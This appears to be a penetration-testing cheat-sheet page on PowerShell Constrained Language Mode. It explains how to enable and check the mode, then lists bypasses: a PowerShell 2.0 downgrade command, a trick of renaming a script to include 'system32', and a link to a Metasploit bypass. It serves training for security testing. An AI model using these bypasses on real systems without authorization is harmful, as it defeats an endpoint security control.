# CLM

<details>

<summary>What is it? + How to enable?</summary>

* Constrained Language Mode is a PowerShell security restriction enforced by Windows Defender Application Control (WDAC) or Device Guard.&#x20;
* It limits access to certain commands and features, reducing the risk of malicious script execution.

- Run the following command on admin powershell.exe:

```
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
```

</details>

<details>

<summary>Checking CLM</summary>

```
$ExecutionContext.SessionState.LanguageMode
```

* `FullLanguage` → **No restrictions** (default for admin users).
* `RestrictedLanguage` → **Highly restricted**, only allows basic expressions.
* `ConstrainedLanguage` → **Blocks .NET, COM objects, and Reflection**, while allowing most built-in cmdlets.

</details>

<details>

<summary>Bypassing CLM (Powershell Downgrade)</summary>

powershell.exe -Version 2.0

</details>

<details>

<summary>Bypassing CLM (System32 Bypass)</summary>

* From [https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass#system32-bypass](https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass#system32-bypass)
* Path from where your script is being executed needs to contain the string `system32`

```
PS>cat .\test.ps1
$ExecutionContext.SessionState.LanguageMode

PS>.\test.ps1; mv .\test.ps1 system32.ps1; .\system32.ps1
ConstrainedLanguage
FullLanguage
```



</details>

<details>

<summary>Bypass CLM (Metasploit)</summary>

[https://github.com/beauknowstech/OSEP-Everything/tree/main/CLM%20bypass](https://github.com/beauknowstech/OSEP-Everything/tree/main/CLM%20bypass)

</details>



